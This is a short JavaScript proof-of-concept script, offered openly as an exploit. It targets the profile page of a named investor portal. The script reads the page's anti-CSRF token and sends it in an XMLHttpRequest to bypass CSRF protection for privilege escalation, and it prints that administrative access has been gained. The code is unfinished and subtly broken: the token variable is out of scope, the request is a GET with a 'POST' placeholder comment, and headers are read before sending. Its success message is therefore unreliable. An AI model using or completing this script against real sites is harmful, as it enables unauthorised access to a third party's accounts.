//BEGIN
console.log("Initiating exploit...");
//console.log("GET URL is: " + GET_URL);
//console.log("might need to put the entire https:// URL here if this fails..");

var priveEscTarget = "https://investorportal.ispt.net.au/my-profile"; //be sure to change this when making POST
console.log("Targetting: " + priveEscTarget);

function readToken() {
  console.log("Reading response to extract anti-CSRF token...");
  var extract = document.querySelector('input[name=_token]').value;
  console.log("Token extracted successfully: " + extract);
  console.log(" ");

}

function bypassCSRF() {
  console.log("Instantiating XMLHttpRequest...");
  //instantiating XMLHttpRequest
  var poc = new XMLHttpRequest();
  console.log("Assigning payload...");
  poc.open("GET", priveEscTarget); //need to add the POST CSRF req here associtaed with user role access, with http post body data included.
  console.log("Parsing token to XHR to bypass CSRF protection mechanism...");
  poc.setRequestHeader("X-CSRF-TOKEN", extract);
  console.log("Firing exploit...");
  //below is for debugging, can be deleted
  console.log("Debugging if X-CSRF-TOKEN header is submitted: ");
  var headers = poc.getAllResponseHeaders();
  console.log(headers);
  // end of debugging
  poc.send();
  console.log("Exploit completed! You should now have Administrative access!");
  console.log(" ");
}

readToken();
bypassCSRF();

//console.log("Done! Verify extracted token value is correct, if so; write xhr function to fire the privesc");
//var GET_URL="https://investorportal.ispt.net.au/my-profile";
//getTokenJS();
console.log("end of exploit");
//EOF
